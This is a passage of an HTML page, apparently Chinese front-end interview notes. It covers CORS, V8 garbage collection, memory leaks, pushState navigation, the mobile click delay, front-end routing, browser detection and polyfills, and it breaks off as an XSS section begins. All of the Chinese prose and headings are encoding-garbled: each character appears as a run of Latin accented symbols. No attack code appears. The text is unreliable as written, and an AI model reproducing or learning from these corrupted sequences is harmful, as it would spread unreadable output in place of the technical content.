class="headerlink" title="CORS"></a>CORS</h2><p>CORS éœ€è¦æµè§ˆå™¨å’Œåç«¯åŒæ—¶æ”¯æŒã€‚IE 8 å’Œ 9 éœ€è¦é€šè¿‡ <code>XDomainRequest</code> æ¥å®ç°ã€‚æµè§ˆå™¨ä¼šè‡ªåŠ¨è¿›è¡Œ CORS é€šä¿¡ï¼Œå®ç° CORS é€šä¿¡çš„å…³é”®æ˜¯åç«¯ã€‚åªè¦åç«¯å®ç°äº† CORSï¼Œå°±å®ç°äº†è·¨åŸŸã€‚</p><p>æœåŠ¡ç«¯è®¾ç½® <code>Access-Control-Allow-Origin</code> å°±å¯ä»¥å¼€å¯ CORSã€‚ è¯¥å±æ€§è¡¨ç¤ºå“ªäº›åŸŸåå¯ä»¥è®¿é—®èµ„æºï¼Œå¦‚æœè®¾ç½®é€šé…ç¬¦åˆ™è¡¨ç¤ºæ‰€æœ‰ç½‘ç«™éƒ½å¯ä»¥è®¿é—®èµ„æºã€‚</p><p>è™½ç„¶è®¾ç½® CORS å’Œå‰ç«¯æ²¡ä»€ä¹ˆå…³ç³»ï¼Œä½†æ˜¯é€šè¿‡è¿™ç§æ–¹å¼è§£å†³è·¨åŸŸé—®é¢˜çš„è¯ï¼Œä¼šåœ¨å‘é€è¯·æ±‚æ—¶å‡ºç°ä¸¤ç§æƒ…å†µï¼Œåˆ†åˆ«ä¸º<strong>ç®€å•è¯·æ±‚å’Œå¤æ‚è¯·æ±‚</strong>ã€‚</p><p>ï¼ˆ6ï¼‰ä½¿ç”¨ CORS çš„æ–¹å¼ï¼ŒCORS æ˜¯ä¸€ä¸ª W3C æ ‡å‡†ï¼Œå…¨ç§°æ˜¯â€è·¨åŸŸèµ„æºå…±äº«â€ã€‚CORS éœ€è¦æµè§ˆå™¨å’ŒæœåŠ¡å™¨åŒæ—¶æ”¯æŒã€‚ç›®å‰ï¼Œæ‰€æœ‰æµè§ˆå™¨éƒ½æ”¯æŒè¯¥åŠŸèƒ½ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦åœ¨æœåŠ¡å™¨ç«¯é…ç½®å°±è¡Œã€‚æµè§ˆå™¨å°† CORS è¯·æ±‚åˆ†æˆä¸¤ç±»ï¼šç®€å•è¯·æ±‚å’Œéç®€å•è¯·æ±‚ã€‚å¯¹äºç®€å•è¯·æ±‚ï¼Œæµè§ˆå™¨ç›´æ¥å‘å‡º CORS è¯·æ±‚ã€‚å…·ä½“æ¥è¯´ï¼Œå°±æ˜¯ä¼šåœ¨å¤´ä¿¡æ¯ä¹‹ä¸­ï¼Œå¢åŠ ä¸€ä¸ª Origin å­—æ®µã€‚Origin å­—æ®µç”¨æ¥è¯´æ˜æœ¬æ¬¡è¯·æ±‚æ¥è‡ªå“ªä¸ªæºã€‚æœåŠ¡å™¨æ ¹æ®è¿™ä¸ªå€¼ï¼Œå†³å®šæ˜¯å¦åŒæ„è¿™æ¬¡è¯·æ±‚ã€‚å¯¹äºå¦‚æœ Origin æŒ‡å®šçš„æºï¼Œä¸åœ¨è®¸å¯èŒƒå›´å†…ï¼ŒæœåŠ¡å™¨ä¼šè¿”å›ä¸€ä¸ªæ­£å¸¸çš„ HTTP å›åº”ã€‚æµè§ˆå™¨å‘ç°ï¼Œè¿™ä¸ªå›åº”çš„å¤´ä¿¡æ¯æ²¡æœ‰åŒ…å« Access-Control-Allow-Origin å­—æ®µï¼Œå°±çŸ¥é“å‡ºé”™äº†ï¼Œä»è€ŒæŠ›å‡ºä¸€ä¸ªé”™è¯¯ï¼Œajax ä¸ä¼šæ”¶åˆ°å“åº”ä¿¡æ¯ã€‚å¦‚æœæˆåŠŸçš„è¯ä¼šåŒ…å«ä¸€äº›ä»¥ Access-Control- å¼€å¤´çš„å­—æ®µã€‚</p><p>éç®€å•è¯·æ±‚ï¼Œæµè§ˆå™¨ä¼šå…ˆå‘å‡ºä¸€æ¬¡é¢„æ£€è¯·æ±‚ï¼Œæ¥åˆ¤æ–­è¯¥åŸŸåæ˜¯å¦åœ¨æœåŠ¡å™¨çš„ç™½åå•ä¸­ï¼Œå¦‚æœæ”¶åˆ°è‚¯å®šå›å¤åæ‰ä¼šå‘èµ·è¯·æ±‚ã€‚</p><p>ï¼ˆ7ï¼‰ä½¿ç”¨ websocket åè®®ï¼Œè¿™ä¸ªåè®®æ²¡æœ‰åŒæºé™åˆ¶ã€‚</p><p>ï¼ˆ8ï¼‰ä½¿ç”¨æœåŠ¡å™¨æ¥ä»£ç†è·¨åŸŸçš„è®¿é—®è¯·æ±‚ï¼Œå°±æ˜¯æœ‰è·¨åŸŸçš„è¯·æ±‚æ“ä½œæ—¶å‘é€è¯·æ±‚ç»™åç«¯ï¼Œè®©åç«¯ä»£ä¸ºè¯·æ±‚ï¼Œç„¶åæœ€åå°†è·å–çš„ç»“æœå‘è¿”å›ã€‚</p><h1 id="ç®€å•ä»‹ç»ä¸€ä¸‹-V8-å¼•æ“çš„åƒåœ¾å›æ”¶æœºåˆ¶"><a href="#ç®€å•ä»‹ç»ä¸€ä¸‹-V8-å¼•æ“çš„åƒåœ¾å›æ”¶æœºåˆ¶" class="headerlink" title="ç®€å•ä»‹ç»ä¸€ä¸‹ V8 å¼•æ“çš„åƒåœ¾å›æ”¶æœºåˆ¶"></a>ç®€å•ä»‹ç»ä¸€ä¸‹ V8 å¼•æ“çš„åƒåœ¾å›æ”¶æœºåˆ¶</h1><p>v8 çš„åƒåœ¾å›æ”¶æœºåˆ¶åŸºäºåˆ†ä»£å›æ”¶æœºåˆ¶ï¼Œè¿™ä¸ªæœºåˆ¶åˆåŸºäºä¸–ä»£å‡è¯´ï¼Œè¿™ä¸ªå‡è¯´æœ‰ä¸¤ä¸ªç‰¹ç‚¹ï¼Œä¸€æ˜¯æ–°ç”Ÿçš„å¯¹è±¡å®¹æ˜“æ—©æ­»ï¼Œå¦ä¸€ä¸ªæ˜¯ä¸æ­»çš„å¯¹è±¡ä¼šæ´»å¾—æ›´ä¹…ã€‚åŸºäºè¿™ä¸ªå‡è¯´ï¼Œv8 å¼•æ“å°†å†…å­˜åˆ†ä¸ºäº†æ–°ç”Ÿä»£å’Œè€ç”Ÿä»£ã€‚</p><p>æ–°åˆ›å»ºçš„å¯¹è±¡æˆ–è€…åªç»å†è¿‡ä¸€æ¬¡çš„åƒåœ¾å›æ”¶çš„å¯¹è±¡è¢«ç§°ä¸ºæ–°ç”Ÿä»£ã€‚ç»å†è¿‡å¤šæ¬¡åƒåœ¾å›æ”¶çš„å¯¹è±¡è¢«ç§°ä¸ºè€ç”Ÿä»£ã€‚</p><p>æ–°ç”Ÿä»£è¢«åˆ†ä¸º From å’Œ To ä¸¤ä¸ªç©ºé—´ï¼ŒTo ä¸€èˆ¬æ˜¯é—²ç½®çš„ã€‚å½“ From ç©ºé—´æ»¡äº†çš„æ—¶å€™ä¼šæ‰§è¡Œ Scavenge ç®—æ³•è¿›è¡Œåƒåœ¾å›æ”¶ã€‚å½“æˆ‘ä»¬æ‰§è¡Œåƒåœ¾å›æ”¶ç®—æ³•çš„æ—¶å€™åº”ç”¨é€»è¾‘å°†ä¼šåœæ­¢ï¼Œç­‰åƒåœ¾å›æ”¶ç»“æŸåå†ç»§ç»­æ‰§è¡Œã€‚è¿™ä¸ªç®—æ³•åˆ†ä¸ºä¸‰æ­¥ï¼š</p><p>ï¼ˆ1ï¼‰é¦–å…ˆæ£€æŸ¥ From ç©ºé—´çš„å­˜æ´»å¯¹è±¡ï¼Œå¦‚æœå¯¹è±¡å­˜æ´»åˆ™åˆ¤æ–­å¯¹è±¡æ˜¯å¦æ»¡è¶³æ™‹å‡åˆ°è€ç”Ÿä»£çš„æ¡ä»¶ï¼Œå¦‚æœæ»¡è¶³æ¡ä»¶åˆ™æ™‹å‡åˆ°è€ç”Ÿä»£ã€‚å¦‚æœä¸æ»¡è¶³æ¡ä»¶åˆ™ç§»åŠ¨ To ç©ºé—´ã€‚</p><p>ï¼ˆ2ï¼‰å¦‚æœå¯¹è±¡ä¸å­˜æ´»ï¼Œåˆ™é‡Šæ”¾å¯¹è±¡çš„ç©ºé—´ã€‚</p><p>ï¼ˆ3ï¼‰æœ€åå°† From ç©ºé—´å’Œ To ç©ºé—´è§’è‰²è¿›è¡Œäº¤æ¢ã€‚</p><p>æ–°ç”Ÿä»£å¯¹è±¡æ™‹å‡åˆ°è€ç”Ÿä»£æœ‰ä¸¤ä¸ªæ¡ä»¶ï¼š</p><p>ï¼ˆ1ï¼‰ç¬¬ä¸€ä¸ªæ˜¯åˆ¤æ–­æ˜¯å¯¹è±¡å¦å·²ç»ç»è¿‡ä¸€æ¬¡ Scavenge å›æ”¶ã€‚è‹¥ç»å†è¿‡ï¼Œåˆ™å°†å¯¹è±¡ä» From ç©ºé—´å¤åˆ¶åˆ°è€ç”Ÿä»£ä¸­ï¼›è‹¥æ²¡æœ‰ç»å†ï¼Œåˆ™å¤åˆ¶åˆ° To ç©ºé—´ã€‚</p><p>ï¼ˆ2ï¼‰ç¬¬äºŒä¸ªæ˜¯ To ç©ºé—´çš„å†…å­˜ä½¿ç”¨å æ¯”æ˜¯å¦è¶…è¿‡é™åˆ¶ã€‚å½“å¯¹è±¡ä» From ç©ºé—´å¤åˆ¶åˆ° To ç©ºé—´æ—¶ï¼Œè‹¥ To ç©ºé—´ä½¿ç”¨è¶…è¿‡ 25%ï¼Œåˆ™å¯¹è±¡ç›´æ¥æ™‹å‡åˆ°è€ç”Ÿä»£ä¸­ã€‚è®¾ç½® 25% çš„åŸå› ä¸»è¦æ˜¯å› ä¸ºç®—æ³•ç»“æŸåï¼Œä¸¤ä¸ªç©ºé—´ç»“æŸåä¼šäº¤æ¢ä½ç½®ï¼Œå¦‚æœ To ç©ºé—´çš„å†…å­˜å¤ªå°ï¼Œä¼šå½±å“åç»­çš„å†…å­˜åˆ†é…ã€‚</p><p>è€ç”Ÿä»£é‡‡ç”¨äº†æ ‡è®°æ¸…é™¤æ³•å’Œæ ‡è®°å‹ç¼©æ³•ã€‚æ ‡è®°æ¸…é™¤æ³•é¦–å…ˆä¼šå¯¹å†…å­˜ä¸­å­˜æ´»çš„å¯¹è±¡è¿›è¡Œæ ‡è®°ï¼Œæ ‡è®°ç»“æŸåæ¸…é™¤æ‰é‚£äº›æ²¡æœ‰æ ‡è®°çš„å¯¹è±¡ã€‚ç”±äºæ ‡è®°æ¸…é™¤åä¼šé€ æˆå¾ˆå¤šçš„å†…å­˜ç¢ç‰‡ï¼Œä¸ä¾¿äºåé¢çš„å†…å­˜åˆ†é…ã€‚æ‰€ä»¥äº†è§£å†³å†…å­˜ç¢ç‰‡çš„é—®é¢˜å¼•å…¥äº†æ ‡è®°å‹ç¼©æ³•ã€‚</p><p>ç”±äºåœ¨è¿›è¡Œåƒåœ¾å›æ”¶çš„æ—¶å€™ä¼šæš‚åœåº”ç”¨çš„é€»è¾‘ï¼Œå¯¹äºæ–°ç”Ÿä»£æ–¹æ³•ç”±äºå†…å­˜å°ï¼Œæ¯æ¬¡åœé¡¿çš„æ—¶é—´ä¸ä¼šå¤ªé•¿ï¼Œä½†å¯¹äºè€ç”Ÿä»£æ¥è¯´æ¯æ¬¡åƒåœ¾å›æ”¶çš„æ—¶é—´é•¿ï¼Œåœé¡¿ä¼šé€ æˆå¾ˆå¤§çš„å½±å“ã€‚ ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ V8 å¼•å…¥äº†å¢é‡æ ‡è®°çš„æ–¹æ³•ï¼Œå°†ä¸€æ¬¡åœé¡¿è¿›è¡Œçš„è¿‡ç¨‹åˆ†ä¸ºäº†å¤šæ­¥ï¼Œæ¯æ¬¡æ‰§è¡Œå®Œä¸€å°æ­¥å°±è®©è¿è¡Œé€»è¾‘æ‰§è¡Œä¸€ä¼šï¼Œå°±è¿™æ ·äº¤æ›¿è¿è¡Œã€‚</p><h1 id="å“ªäº›æ“ä½œä¼šé€ æˆå†…å­˜æ³„æ¼ï¼Ÿ"><a href="#å“ªäº›æ“ä½œä¼šé€ æˆå†…å­˜æ³„æ¼ï¼Ÿ" class="headerlink" title="å“ªäº›æ“ä½œä¼šé€ æˆå†…å­˜æ³„æ¼ï¼Ÿ"></a>å“ªäº›æ“ä½œä¼šé€ æˆå†…å­˜æ³„æ¼ï¼Ÿ</h1><ul><li>æ„å¤–çš„å…¨å±€å˜é‡ã€‚ç”±äºä½¿ç”¨æœªå£°æ˜çš„å˜é‡ï¼Œè€Œæ„å¤–çš„åˆ›å»ºäº†ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œè€Œä½¿è¿™ä¸ªå˜é‡ä¸€ç›´ç•™åœ¨å†…å­˜ä¸­æ— æ³•è¢«å›æ”¶ã€‚</li><li>è¢«é—å¿˜çš„è®¡æ—¶å™¨æˆ–å›è°ƒå‡½æ•°ã€‚è®¾ç½®äº† setInterval å®šæ—¶å™¨ï¼Œè€Œå¿˜è®°å–æ¶ˆå®ƒï¼Œå¦‚æœå¾ªç¯å‡½æ•°æœ‰å¯¹å¤–éƒ¨å˜é‡çš„å¼•ç”¨çš„è¯ï¼Œé‚£ä¹ˆè¿™ä¸ªå˜é‡ä¼šè¢«ä¸€ç›´ç•™<br>åœ¨å†…å­˜ä¸­ï¼Œè€Œæ— æ³•è¢«å›æ”¶ã€‚</li><li>è„±ç¦» DOM çš„å¼•ç”¨ã€‚è·å–ä¸€ä¸ª DOM å…ƒç´ çš„å¼•ç”¨ï¼Œè€Œåé¢è¿™ä¸ªå…ƒç´ è¢«åˆ é™¤ï¼Œç”±äºæˆ‘ä»¬ä¸€ç›´ä¿ç•™äº†å¯¹è¿™ä¸ªå…ƒç´ çš„å¼•ç”¨ï¼Œæ‰€ä»¥å®ƒä¹Ÿæ— æ³•è¢«å›æ”¶ã€‚</li><li>é—­åŒ…ã€‚ä¸åˆç†çš„ä½¿ç”¨é—­åŒ…ï¼Œä»è€Œå¯¼è‡´æŸäº›å˜é‡ä¸€ç›´è¢«ç•™åœ¨å†…å­˜å½“ä¸­ã€‚</li></ul><h1 id="éœ€æ±‚ï¼šå®ç°ä¸€ä¸ªé¡µé¢æ“ä½œä¸ä¼šæ•´é¡µåˆ·æ–°çš„ç½‘ç«™ï¼Œå¹¶ä¸”èƒ½åœ¨æµè§ˆå™¨å‰è¿›ã€åé€€æ—¶æ­£ç¡®å“åº”ã€‚ç»™å‡ºä½ çš„æŠ€æœ¯å®ç°æ–¹æ¡ˆï¼Ÿ"><a href="#éœ€æ±‚ï¼šå®ç°ä¸€ä¸ªé¡µé¢æ“ä½œä¸ä¼šæ•´é¡µåˆ·æ–°çš„ç½‘ç«™ï¼Œå¹¶ä¸”èƒ½åœ¨æµè§ˆå™¨å‰è¿›ã€åé€€æ—¶æ­£ç¡®å“åº”ã€‚ç»™å‡ºä½ çš„æŠ€æœ¯å®ç°æ–¹æ¡ˆï¼Ÿ" class="headerlink" title="éœ€æ±‚ï¼šå®ç°ä¸€ä¸ªé¡µé¢æ“ä½œä¸ä¼šæ•´é¡µåˆ·æ–°çš„ç½‘ç«™ï¼Œå¹¶ä¸”èƒ½åœ¨æµè§ˆå™¨å‰è¿›ã€åé€€æ—¶æ­£ç¡®å“åº”ã€‚ç»™å‡ºä½ çš„æŠ€æœ¯å®ç°æ–¹æ¡ˆï¼Ÿ"></a>éœ€æ±‚ï¼šå®ç°ä¸€ä¸ªé¡µé¢æ“ä½œä¸ä¼šæ•´é¡µåˆ·æ–°çš„ç½‘ç«™ï¼Œå¹¶ä¸”èƒ½åœ¨æµè§ˆå™¨å‰è¿›ã€åé€€æ—¶æ­£ç¡®å“åº”ã€‚ç»™å‡ºä½ çš„æŠ€æœ¯å®ç°æ–¹æ¡ˆï¼Ÿ</h1><p>é€šè¿‡ä½¿ç”¨ pushState + ajax å®ç°æµè§ˆå™¨æ— åˆ·æ–°å‰è¿›åé€€ï¼Œå½“ä¸€æ¬¡ ajax è°ƒç”¨æˆåŠŸåæˆ‘ä»¬å°†ä¸€æ¡ state è®°å½•åŠ å…¥åˆ° historyå¯¹è±¡ä¸­ã€‚ä¸€æ¡ state è®°å½•åŒ…å«äº† urlã€title å’Œ content å±æ€§ï¼Œåœ¨ popstate äº‹ä»¶ä¸­å¯ä»¥è·å–åˆ°è¿™ä¸ª state å¯¹è±¡ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ content æ¥ä¼ é€’æ•°æ®ã€‚æœ€åæˆ‘ä»¬é€šè¿‡å¯¹ window.onpopstate äº‹ä»¶ç›‘å¬æ¥å“åº”æµè§ˆå™¨çš„å‰è¿›åé€€æ“ä½œã€‚</p><p>ä½¿ç”¨ pushState æ¥å®ç°æœ‰ä¸¤ä¸ªé—®é¢˜ï¼Œä¸€ä¸ªæ˜¯æ‰“å¼€é¦–é¡µæ—¶æ²¡æœ‰è®°å½•ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ replaceState æ¥å°†é¦–é¡µçš„è®°å½•æ›¿æ¢ï¼Œå¦ä¸€ä¸ªé—®é¢˜æ˜¯å½“ä¸€ä¸ªé¡µé¢åˆ·æ–°çš„æ—¶å€™ï¼Œä»ç„¶ä¼šå‘æœåŠ¡å™¨ç«¯è¯·æ±‚æ•°æ®ï¼Œå› æ­¤å¦‚æœè¯·æ±‚çš„ url éœ€è¦åç«¯çš„é…åˆå°†å…¶é‡å®šå‘åˆ°ä¸€ä¸ªé¡µé¢ã€‚</p><h1 id="å¦‚ä½•åˆ¤æ–­å½“å‰è„šæœ¬è¿è¡Œåœ¨æµè§ˆå™¨è¿˜æ˜¯-node-ç¯å¢ƒä¸­ï¼Ÿï¼ˆé˜¿é‡Œï¼‰"><a href="#å¦‚ä½•åˆ¤æ–­å½“å‰è„šæœ¬è¿è¡Œåœ¨æµè§ˆå™¨è¿˜æ˜¯-node-ç¯å¢ƒä¸­ï¼Ÿï¼ˆé˜¿é‡Œï¼‰" class="headerlink" title="å¦‚ä½•åˆ¤æ–­å½“å‰è„šæœ¬è¿è¡Œåœ¨æµè§ˆå™¨è¿˜æ˜¯ node ç¯å¢ƒä¸­ï¼Ÿï¼ˆé˜¿é‡Œï¼‰"></a>å¦‚ä½•åˆ¤æ–­å½“å‰è„šæœ¬è¿è¡Œåœ¨æµè§ˆå™¨è¿˜æ˜¯ node ç¯å¢ƒä¸­ï¼Ÿï¼ˆé˜¿é‡Œï¼‰</h1><p>typeof window === â€˜undefinedâ€™ ? â€˜nodeâ€™ : â€˜browserâ€™;</p><p>é€šè¿‡åˆ¤æ–­å½“å‰ç¯å¢ƒçš„ window å¯¹è±¡ç±»å‹æ˜¯å¦ä¸º undefinedï¼Œå¦‚æœæ˜¯undefinedï¼Œåˆ™è¯´æ˜å½“å‰è„šæœ¬è¿è¡Œåœ¨nodeç¯å¢ƒï¼Œå¦åˆ™è¯´æ˜è¿è¡Œåœ¨windowç¯å¢ƒã€‚</p><h1 id="ç§»åŠ¨ç«¯çš„ç‚¹å‡»äº‹ä»¶çš„æœ‰å»¶è¿Ÿï¼Œæ—¶é—´æ˜¯å¤šä¹…ï¼Œä¸ºä»€ä¹ˆä¼šæœ‰ï¼Ÿ-æ€ä¹ˆè§£å†³è¿™ä¸ªå»¶æ—¶ï¼Ÿ"><a href="#ç§»åŠ¨ç«¯çš„ç‚¹å‡»äº‹ä»¶çš„æœ‰å»¶è¿Ÿï¼Œæ—¶é—´æ˜¯å¤šä¹…ï¼Œä¸ºä»€ä¹ˆä¼šæœ‰ï¼Ÿ-æ€ä¹ˆè§£å†³è¿™ä¸ªå»¶æ—¶ï¼Ÿ" class="headerlink" title="ç§»åŠ¨ç«¯çš„ç‚¹å‡»äº‹ä»¶çš„æœ‰å»¶è¿Ÿï¼Œæ—¶é—´æ˜¯å¤šä¹…ï¼Œä¸ºä»€ä¹ˆä¼šæœ‰ï¼Ÿ æ€ä¹ˆè§£å†³è¿™ä¸ªå»¶æ—¶ï¼Ÿ"></a>ç§»åŠ¨ç«¯çš„ç‚¹å‡»äº‹ä»¶çš„æœ‰å»¶è¿Ÿï¼Œæ—¶é—´æ˜¯å¤šä¹…ï¼Œä¸ºä»€ä¹ˆä¼šæœ‰ï¼Ÿ æ€ä¹ˆè§£å†³è¿™ä¸ªå»¶æ—¶ï¼Ÿ</h1><p>ç§»åŠ¨ç«¯ç‚¹å‡»æœ‰ 300ms çš„å»¶è¿Ÿæ˜¯å› ä¸ºç§»åŠ¨ç«¯ä¼šæœ‰åŒå‡»ç¼©æ”¾çš„è¿™ä¸ªæ“ä½œï¼Œå› æ­¤æµè§ˆå™¨åœ¨ click ä¹‹åè¦ç­‰å¾… 300msï¼Œçœ‹ç”¨æˆ·æœ‰æ²¡æœ‰ä¸‹ä¸€æ¬¡ç‚¹å‡»ï¼Œæ¥åˆ¤æ–­è¿™æ¬¡æ“ä½œæ˜¯ä¸æ˜¯åŒå‡»ã€‚</p><p>æœ‰ä¸‰ç§åŠæ³•æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼š</p><ul><li>é€šè¿‡ meta æ ‡ç­¾ç¦ç”¨ç½‘é¡µçš„ç¼©æ”¾ã€‚</li><li>é€šè¿‡ meta æ ‡ç­¾å°†ç½‘é¡µçš„ viewport è®¾ç½®ä¸º ideal viewportã€‚</li><li>è°ƒç”¨ä¸€äº› js åº“ï¼Œæ¯”å¦‚ FastClick</li></ul><p>click å»¶æ—¶é—®é¢˜è¿˜å¯èƒ½å¼•èµ·ç‚¹å‡»ç©¿é€çš„é—®é¢˜ï¼Œå°±æ˜¯å¦‚æœæˆ‘ä»¬åœ¨ä¸€ä¸ªå…ƒç´ ä¸Šæ³¨å†Œäº† touchStart çš„ç›‘å¬äº‹ä»¶ï¼Œè¿™ä¸ªäº‹ä»¶ä¼šå°†è¿™ä¸ªå…ƒç´ éšè—æ‰ï¼Œæˆ‘ä»¬å‘ç°å½“è¿™ä¸ªå…ƒç´ éšè—åï¼Œè§¦å‘äº†è¿™ä¸ªå…ƒç´ ä¸‹çš„ä¸€ä¸ªå…ƒç´ çš„ç‚¹å‡»äº‹ä»¶ï¼Œè¿™å°±æ˜¯ç‚¹å‡»ç©¿é€ã€‚</p><h1 id="ä»€ä¹ˆæ˜¯â€œå‰ç«¯è·¯ç”±â€ï¼Ÿä»€ä¹ˆæ—¶å€™é€‚åˆä½¿ç”¨â€œå‰ç«¯è·¯ç”±â€ï¼Ÿâ€œå‰ç«¯è·¯ç”±â€æœ‰å“ªäº›ä¼˜ç‚¹å’Œç¼ºç‚¹ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯â€œå‰ç«¯è·¯ç”±â€ï¼Ÿä»€ä¹ˆæ—¶å€™é€‚åˆä½¿ç”¨â€œå‰ç«¯è·¯ç”±â€ï¼Ÿâ€œå‰ç«¯è·¯ç”±â€æœ‰å“ªäº›ä¼˜ç‚¹å’Œç¼ºç‚¹ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯â€œå‰ç«¯è·¯ç”±â€ï¼Ÿä»€ä¹ˆæ—¶å€™é€‚åˆä½¿ç”¨â€œå‰ç«¯è·¯ç”±â€ï¼Ÿâ€œå‰ç«¯è·¯ç”±â€æœ‰å“ªäº›ä¼˜ç‚¹å’Œç¼ºç‚¹ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯â€œå‰ç«¯è·¯ç”±â€ï¼Ÿä»€ä¹ˆæ—¶å€™é€‚åˆä½¿ç”¨â€œå‰ç«¯è·¯ç”±â€ï¼Ÿâ€œå‰ç«¯è·¯ç”±â€æœ‰å“ªäº›ä¼˜ç‚¹å’Œç¼ºç‚¹ï¼Ÿ</h1><p>ï¼ˆ1ï¼‰ä»€ä¹ˆæ˜¯å‰ç«¯è·¯ç”±ï¼Ÿ</p><p>å‰ç«¯è·¯ç”±å°±æ˜¯æŠŠä¸åŒè·¯ç”±å¯¹åº”ä¸åŒçš„å†…å®¹æˆ–é¡µé¢çš„ä»»åŠ¡äº¤ç»™å‰ç«¯æ¥åšï¼Œä¹‹å‰æ˜¯é€šè¿‡æœåŠ¡ç«¯æ ¹æ® url çš„ä¸åŒè¿”å›ä¸åŒçš„é¡µé¢å®ç°çš„ã€‚</p><p>ï¼ˆ2ï¼‰ä»€ä¹ˆæ—¶å€™ä½¿ç”¨å‰ç«¯è·¯ç”±ï¼Ÿ</p><p>åœ¨å•é¡µé¢åº”ç”¨ï¼Œå¤§éƒ¨åˆ†é¡µé¢ç»“æ„ä¸å˜ï¼Œåªæ”¹å˜éƒ¨åˆ†å†…å®¹çš„ä½¿ç”¨</p><p>ï¼ˆ3ï¼‰å‰ç«¯è·¯ç”±æœ‰ä»€ä¹ˆä¼˜ç‚¹å’Œç¼ºç‚¹ï¼Ÿ</p><p>ä¼˜ç‚¹ï¼šç”¨æˆ·ä½“éªŒå¥½ï¼Œä¸éœ€è¦æ¯æ¬¡éƒ½ä»æœåŠ¡å™¨å…¨éƒ¨è·å–ï¼Œå¿«é€Ÿå±•ç°ç»™ç”¨æˆ·</p><p>ç¼ºç‚¹ï¼šå•é¡µé¢æ— æ³•è®°ä½ä¹‹å‰æ»šåŠ¨çš„ä½ç½®ï¼Œæ— æ³•åœ¨å‰è¿›ï¼Œåé€€çš„æ—¶å€™è®°ä½æ»šåŠ¨çš„ä½ç½®</p><p>å‰ç«¯è·¯ç”±ä¸€å…±æœ‰ä¸¤ç§å®ç°æ–¹å¼ï¼Œä¸€ç§æ˜¯é€šè¿‡ hash çš„æ–¹å¼ï¼Œä¸€ç§æ˜¯é€šè¿‡ä½¿ç”¨ pushState çš„æ–¹å¼ã€‚</p><h1 id="æ£€æµ‹æµè§ˆå™¨ç‰ˆæœ¬ç‰ˆæœ¬æœ‰å“ªäº›æ–¹å¼ï¼Ÿ"><a href="#æ£€æµ‹æµè§ˆå™¨ç‰ˆæœ¬ç‰ˆæœ¬æœ‰å“ªäº›æ–¹å¼ï¼Ÿ" class="headerlink" title="æ£€æµ‹æµè§ˆå™¨ç‰ˆæœ¬ç‰ˆæœ¬æœ‰å“ªäº›æ–¹å¼ï¼Ÿ"></a>æ£€æµ‹æµè§ˆå™¨ç‰ˆæœ¬ç‰ˆæœ¬æœ‰å“ªäº›æ–¹å¼ï¼Ÿ</h1><p>æ£€æµ‹æµè§ˆå™¨ç‰ˆæœ¬ä¸€å…±æœ‰ä¸¤ç§æ–¹å¼ï¼š</p><p>ä¸€ç§æ˜¯æ£€æµ‹ window.navigator.userAgent çš„å€¼ï¼Œä½†è¿™ç§æ–¹å¼å¾ˆä¸å¯é ï¼Œå› ä¸º userAgent å¯ä»¥è¢«æ”¹å†™ï¼Œå¹¶ä¸”æ—©æœŸçš„æµè§ˆå™¨å¦‚ ieï¼Œä¼šé€šè¿‡ä¼ªè£…è‡ªå·±çš„ userAgent çš„å€¼ä¸º Mozilla æ¥èº²è¿‡æœåŠ¡å™¨çš„æ£€æµ‹ã€‚</p><p>ç¬¬äºŒç§æ–¹å¼æ˜¯åŠŸèƒ½æ£€æµ‹ï¼Œæ ¹æ®æ¯ä¸ªæµè§ˆå™¨ç‹¬æœ‰çš„ç‰¹æ€§æ¥è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚ ie ä¸‹ç‹¬æœ‰çš„ ActiveXObjectã€‚</p><h1 id="ä»€ä¹ˆæ˜¯-Polyfill-ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯-Polyfill-ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ Polyfill ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ Polyfill ï¼Ÿ</h1><p>Polyfill æŒ‡çš„æ˜¯ç”¨äºå®ç°æµè§ˆå™¨å¹¶ä¸æ”¯æŒçš„åŸç”Ÿ API çš„ä»£ç ã€‚</p><p>æ¯”å¦‚è¯´ querySelectorAll æ˜¯å¾ˆå¤šç°ä»£æµè§ˆå™¨éƒ½æ”¯æŒçš„åŸç”Ÿ Web APIï¼Œä½†æ˜¯æœ‰äº›å¤è€çš„æµè§ˆå™¨å¹¶ä¸æ”¯æŒï¼Œé‚£ä¹ˆå‡è®¾æœ‰äººå†™äº†ä¸€æ®µä»£ç æ¥å®ç°è¿™ä¸ªåŠŸèƒ½ä½¿è¿™äº›æµè§ˆå™¨ä¹Ÿæ”¯æŒäº†è¿™ä¸ªåŠŸèƒ½ï¼Œé‚£ä¹ˆè¿™å°±å¯ä»¥æˆä¸ºä¸€ä¸ª Polyfillã€‚</p><p>ä¸€ä¸ª shim æ˜¯ä¸€ä¸ªåº“ï¼Œæœ‰è‡ªå·±çš„ APIï¼Œè€Œä¸æ˜¯å•çº¯å®ç°åŸç”Ÿä¸æ”¯æŒçš„ APIã€‚</p><h1 id="å®‰å…¨é˜²èŒƒçŸ¥è¯†ç‚¹"><a href="#å®‰å…¨é˜²èŒƒçŸ¥è¯†ç‚¹" class="headerlink" title="å®‰å…¨é˜²èŒƒçŸ¥è¯†ç‚¹"></a>å®‰å…¨é˜²èŒƒçŸ¥è¯†ç‚¹</h1><p>å‚è€ƒè‡ª <a href="https://juejin.cn/book/6844733763675488269/section/6844733763776151565">å‰ç«¯é¢è¯•ä¹‹é“</a>ã€‚</p><h2 id="ä»€ä¹ˆæ˜¯-XSS-æ”»å‡»ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯-XSS-æ”»å‡»ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ XSS æ”»å‡»ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ XSS æ”»å‡»ï¼Ÿ</h2><p>XSS æ”»å‡»æŒ‡çš„æ˜¯è·¨ç«™è„šæœ¬æ”»å‡»ï¼Œæ˜¯ä¸€ç§ä»£ç 